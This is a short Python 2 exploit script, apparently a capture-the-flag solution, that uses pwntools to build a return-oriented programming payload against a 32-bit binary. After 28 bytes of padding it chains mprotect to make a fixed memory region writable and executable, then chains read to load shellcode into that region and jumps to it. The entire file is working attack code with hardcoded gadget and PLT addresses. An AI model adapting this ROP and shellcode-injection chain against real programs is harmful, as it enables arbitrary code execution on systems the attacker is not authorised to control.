#!/usr/bin/python2

from pwn import *


POPRET  = 0x80481c9
POP2RET = 0x80483c9
POP4RET = 0x80483c7
POP3RET = 0x80483c8

READ_PLT = 0x806d5f0
WRITE_PLT= 0x806d660
MPROTECT_PLT = 0x806e0f0
EXIT_PLT= 0x804e2c0
WRITEABLE_ADDRESS = 0x080eb000

pay = "A" * 28

# Change Permission of Memory 0x080eb000
pay += p32(MPROTECT_PLT)
pay += p32(POP3RET)
pay += p32(WRITEABLE_ADDRESS)
pay += p32(1000)
pay += p32(7)

# read shellcode and write to 0x080eb000
pay += p32(READ_PLT)
pay += p32(POP3RET)
pay += p32(0)
pay += p32(WRITEABLE_ADDRESS)
pay += p32(44)

pay += p32(WRITEABLE_ADDRESS)

print pay